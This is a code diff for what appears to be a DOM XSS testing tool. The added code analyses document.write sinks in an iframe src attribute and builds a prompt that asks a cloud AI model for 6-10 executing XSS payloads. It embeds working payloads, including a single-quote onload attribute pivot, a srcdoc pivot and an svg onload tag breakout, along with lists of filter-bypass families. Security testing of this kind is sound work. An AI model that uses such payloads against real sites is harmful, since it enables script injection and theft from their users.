@@ -406,6 +406,69 @@ def _dom_seed_examples(profile_name: str) -> list[dict[str, Any]]:
     return []
 
 
+def _document_write_subcontext(context: ParsedContext) -> dict[str, Any]:
+    """Infer a narrower HTML subcontext for document.write sinks when possible."""
+    dom_runtime = _extract_dom_runtime_context(context)
+    source_type = dom_runtime.get("source_type", "")
+    source_name = dom_runtime.get("source_name", "")
+
+    for script in context.inline_scripts:
+        compact = " ".join(script.split())
+        lower = compact.lower()
+        if "document.write" not in lower:
+            continue
+
+        hint: dict[str, Any] = {
+            "script_excerpt": compact[:240],
+            "source_type": source_type,
+            "source_name": source_name,
+        }
+
+        if "<iframe" in lower and "src='" in lower:
+            hint.update(
+                {
+                    "html_subcontext": "single_quoted_html_attr",
+                    "tag": "iframe",
+                    "attribute": "src",
+                    "quote_style": "single",
+                    "payload_shape": "same_tag_attribute_breakout",
+                    "attacker_prefix": "<iframe src='",
+                }
+            )
+            if "' width='" in compact:
+                suffix = compact.split("' width='", 1)[1]
+                hint["attacker_suffix"] = "' width='" + suffix[:80]
+            hint["recommended_families"] = [
+                "same-tag event handler injection",
+                "srcdoc pivot",
+                "quote closure without angle brackets",
+                "full tag escape only if angle brackets are likely to survive",
+            ]
+            if source_type == "fragment":
+                hint["source_behavior"] = (
+                    "Fragment payloads often arrive URL-encoded inside the iframe src string. "
+                    "Prefer quote closure and same-tag attribute injection before relying on raw < >."
+                )
+            elif source_type == "query_param":
+                hint["source_behavior"] = (
+                    "The full query string is concatenated into the iframe src URL. "
+                    "Prefer breaking out of the single-quoted src attribute before attempting full-tag injection."
+                )
+            return hint
+
+    return {
+        "html_subcontext": "unknown_document_write_markup",
+        "source_type": source_type,
+        "source_name": source_name,
+        "recommended_families": [
+            "same-tag attribute injection",
+            "quote closure",
+            "srcdoc pivot",
+            "full tag escape",
+        ],
+    }
+
+
 def _compact_dom_prompt_for_cloud(
     context: ParsedContext,
     waf: str | None = None,
@@ -496,6 +559,102 @@ DOM runtime:
 {json.dumps(context_summary, indent=2)}""".strip()
 
 
+def _document_write_prompt_for_cloud(
+    context: ParsedContext,
+    waf: str | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+) -> str:
+    """Build a focused rich prompt for document.write DOM sinks."""
+    dom_runtime = _extract_dom_runtime_context(context)
+    subcontext = _document_write_subcontext(context)
+
+    lessons_section = ""
+    if past_lessons:
+        lesson_lines = []
+        for lesson in past_lessons[:4]:
+            title = getattr(lesson, "title", "")
+            summary = getattr(lesson, "summary", "")
+            if title or summary:
+                lesson_lines.append(f"- {title}: {summary}".strip(": "))
+        if lesson_lines:
+            lessons_section = "Runtime lessons:\n" + "\n".join(lesson_lines) + "\n"
+
+    targeted_examples = [
+        {
+            "payload": "'onload='alert(1)",
+            "title": "same-tag onload pivot",
+            "why": "Closes a single-quoted iframe src attribute and injects an event handler without needing angle brackets.",
+        },
+        {
+            "payload": "'srcdoc='&#x3C;svg/onload=alert(1)&#x3E;'>",
+            "title": "srcdoc pivot",
+            "why": "Breaks out of the iframe src attribute and swaps execution into srcdoc using encoded markup.",
+        },
+        {
+            "payload": "'><svg onload=alert(1)>",
+            "title": "full tag escape",
+            "why": "Useful only if angle brackets survive to the document.write sink.",
+        },
+    ]
+
+    context_summary = {
+        "source": context.source,
+        "frameworks": context.frameworks[:3],
+        "auth": bool(context.auth_notes),
+        "dom_runtime": dom_runtime,
+        "document_write_subcontext": subcontext,
+        "inline_scripts": context.inline_scripts[:2],
+    }
+
+    waf_line = f"WAF: {waf}\n" if waf else ""
+    recommended = "\n".join(
+        f"- {item}" for item in subcontext.get("recommended_families", [])
+    )
+
+    return f"""You are generating authorized DOM XSS test payloads for a cloud model pass.
+Return ONLY a JSON object.
+
+Output schema:
+{{
+  "payloads": [
+    {{
+      "payload": "string",
+      "title": "short name",
+      "explanation": "why it fits this exact document.write subcontext",
+      "test_vector": "exact delivery string",
+      "tags": ["tag1", "tag2"],
+      "target_sink": "document.write",
+      "bypass_family": "best-fit family",
+      "risk_score": 1-100
+    }}
+  ]
+}}
+
+Requirements:
+- Produce 6-10 payloads only.
+- Do not return an empty payload list.
+- Solve the exact source->sink path below, not generic XSS.
+- Bias toward payloads that execute inside the existing tag first.
+- Include at least:
+  - 3 same-tag attribute pivots that do not require raw < >
+  - 2 srcdoc or URL-attribute pivots if plausible
+  - 1 full tag breakout only if angle brackets might survive
+- Avoid safe parser probes and other non-executing markup.
+- Prefer materially distinct payload families over near-duplicates.
+
+DOM runtime:
+{json.dumps(dom_runtime, indent=2)}
+Document.write subcontext:
+{json.dumps(subcontext, indent=2)}
+Recommended payload families:
+{recommended}
+{waf_line}{lessons_section}Targeted examples:
+{json.dumps(targeted_examples, indent=2)}
+Context summary:
+{json.dumps(context_summary, indent=2)}""".strip()
+
+
 def _cloud_prompt_for_context(
     context: ParsedContext,
     reference_payloads: list[Any] | None = None,
@@ -508,6 +667,13 @@ def _cloud_prompt_for_context(
     if dom_runtime:
         sink = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
         profile_name, _ = _dom_sink_request_profile(sink)
+        if profile_name == "document_write":
+            return _document_write_prompt_for_cloud(
+                context,
+                waf=waf,
+                past_findings=past_findings,
+                past_lessons=past_lessons,
+            )
         if profile_name != "document_write":
             return _compact_dom_prompt_for_cloud(
                 context,
